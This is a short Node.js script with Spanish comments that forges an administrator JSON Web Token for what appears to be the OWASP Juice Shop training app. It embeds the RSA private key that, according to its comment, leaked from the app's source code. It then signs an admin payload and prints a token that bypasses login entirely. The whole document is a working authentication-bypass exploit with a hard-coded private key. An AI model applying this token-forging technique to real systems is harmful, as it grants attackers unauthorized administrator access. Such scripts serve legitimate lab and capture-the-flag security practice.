// Forja un JWT RS256 de admin usando la clave privada RSA filtrada en el propio código
// de la app (lib/insecurity.ts:21). No requiere credenciales ni la librería jsonwebtoken.
const crypto = require('crypto');
const PRIV = "-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\r\n-----END RSA PRIVATE KEY-----";
const b64u = o => Buffer.from(typeof o==='string'?o:JSON.stringify(o)).toString('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
const now = Math.floor(Date.now()/1000);
const header = { alg:'RS256', typ:'JWT' };
const payload = { data:{ id:1, username:'', email:'admin@juice-sh.op', role:'admin', deluxeToken:'', lastLoginIp:'', profileImage:'assets/public/images/uploads/defaultAdmin.png', totpSecret:'', isActive:true }, bid:1, iat:now, exp:now+21600 };
const si = b64u(header)+'.'+b64u(payload);
const sig = crypto.createSign('RSA-SHA256').update(si).sign(PRIV).toString('base64').replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
process.stdout.write(si+'.'+sig);
